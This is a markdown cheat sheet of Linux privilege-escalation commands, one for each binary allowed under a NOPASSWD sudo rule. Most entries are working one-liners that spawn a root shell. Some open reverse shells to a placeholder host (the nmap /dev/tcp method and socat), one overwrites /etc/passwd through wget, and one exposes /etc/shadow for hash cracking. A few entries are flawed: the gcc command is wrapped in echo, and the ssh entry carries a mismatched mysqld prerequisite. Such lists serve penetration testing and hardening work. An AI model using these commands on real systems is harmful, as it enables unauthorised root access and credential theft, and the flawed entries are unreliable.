# Linux Privilege Escalation with Misconfigured sudo
<!-- ------------------------------------------- -->
## find
> (root) NOPASSWD: /usr/bin/find
```bash
sudo find /etc/passwd -exec /bin/bash \;
```
## Nmap 
> (root) NOPASSWD: /usr/bin/nmap
- Method 1 - The input will be invisible, but still executable.
```bash
echo "(function() os.execute('/bin/bash -i') end)()" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

- Method 2 - Use reverse shell method so that the input will not be invisible anymore.
```bash
echo "(function() os.execute('/bin/bash -c \"bash -i >& /dev/tcp/<target_ip>/<target_port> 0>&1\"') end)()" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```
<!-- ------------------------------------------- -->
## env 
> (root) NOPASSWD: /usr/bin/env
```bash
sudo env /bin/bash
```
<!-- ------------------------------------------- -->
## vi
> (root) NOPASSWD: /usr/bin/vi
```bash
sudo vi -c ':!/bin/bash'
```
<!-- ------------------------------------------- -->
## vim
> (root) NOPASSWD: /usr/bin/vim
```bash
sudo vim -c ':!/bin/bash'
```
<!-- ------------------------------------------- -->
## awk
> (root) NOPASSWD: /usr/bin/awk
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```
<!-- ------------------------------------------- -->
## sed
> (root) NOPASSWD: /usr/bin/sed
```bash
sudo sed -n '1e exec sh 1>&0' /etc/passwd
```
<!-- ------------------------------------------- -->
## perl
> (root) NOPASSWD: /usr/bin/perl
```bash
sudo perl -e 'exec "/bin/bash";'
```
<!-- ------------------------------------------- -->
## python3
> (root) NOPASSWD: /usr/bin/python3
```bash
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```
<!-- ------------------------------------------- -->
## less
> (root) NOPASSWD: /usr/bin/less
```bash
sudo less /etc/hosts
```
After that, type `!bash` inside it.
<!-- ------------------------------------------- -->
## man
> (root) NOPASSWD: /usr/bin/man
```bash
sudo man man
```
After that, type `!bash` inside it.
<!-- ------------------------------------------- -->
## ftp
> (root) NOPASSWD: /usr/bin/ftp
```bash
sudo ftp
```
After that, type `! /bin/bash` inside it.
<!-- ------------------------------------------- -->
## socat
> (root) NOPASSWD: /usr/bin/socat
This requires reverse shell approach
- Local Host (For receiving connection - hacker)
```bash
socat file:`tty`,raw,echo=0 tcp-listen:<Local Port>
```
- Remote Host (Victim or Target)
```bash
sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<Target IP>:<Target Port>
```
<!-- ------------------------------------------- -->
## zip
> (root) NOPASSWD: /usr/bin/zip
```bash
echo "test" > /tmp/test && sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
```
<!-- ------------------------------------------- -->
## gcc
> (root) NOPASSWD: /usr/bin/gcc
```bash
echo "sudo gcc -wrapper /bin/bash,-s ."
```
<!-- ------------------------------------------- -->
## docker
> (root) NOPASSWD: /usr/bin/docker
Prerequisite: `docker` daemon must be running.
```bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
<!-- ------------------------------------------- -->
## mysql
> (root) NOPASSWD: /usr/bin/mysql
Prerequisite: `mysqld` daemon must be running.
```bash
sudo mysql -e '\! /bin/sh'
```
<!-- ------------------------------------------- -->
## ssh
> (root) NOPASSWD: /usr/bin/ssh
Prerequisite: `mysqld` daemon must be running.
```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
<!-- ------------------------------------------- -->
## tmux
> (root) NOPASSWD: /usr/bin/tmux
```bash
sudo tmux
```
<!-- ------------------------------------------- -->
## pkexec
> (root) NOPASSWD: /usr/bin/pkexec
```bash
sudo pkexec /bin/bash
```
<!-- ------------------------------------------- -->
## rlwrap
> (root) NOPASSWD: /usr/bin/rlwrap
```bash
sudo rlwrap /bin/bash
```
<!-- ------------------------------------------- -->
## xargs
> (root) NOPASSWD: /usr/bin/xargs
```bash
sudo xargs -a /dev/null sh
```
<!-- ------------------------------------------- -->
## anansi_util
> (root) NOPASSWD: /home/anansi/bin/anansi_util
```bash
sudo /home/anansi/bin/anansi_util manual /bin/bash 
```
<!-- ------------------------------------------- -->
## apt-get
> (root) NOPASSWD: /usr/bin/apt-get
```bash
 sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i" 
```
<!-- ------------------------------------------- -->
## flask
> (root) NOPASSWD: /usr/bin/flask
```bash
cd /tmp
echo 'import pty; pty.spawn("/bin/bash")' > app.py
export FLASK_APP=flask
sudo /usr/bin/flask run
```
<!-- ------------------------------------------- -->
## wget
> (root) NOPASSWD: /usr/bin/wget
- Modify the copied of /etc/passwd with given password and then replace the original using wget.
- Replace "x" with custom generated hash and use that generated password to login as root.
```bash
sudo wget <url that host passwd file> -O /etc/passwd
```
<!-- ------------------------------------------- -->
## apache2
> s(root) NOPASSWD: /usr/sbin/apache2
- Use apache2 to access root protected file such as /etc/shadow
- Crack the hash to get password
```bash
sudo apache2 -f /etc/shadow
```
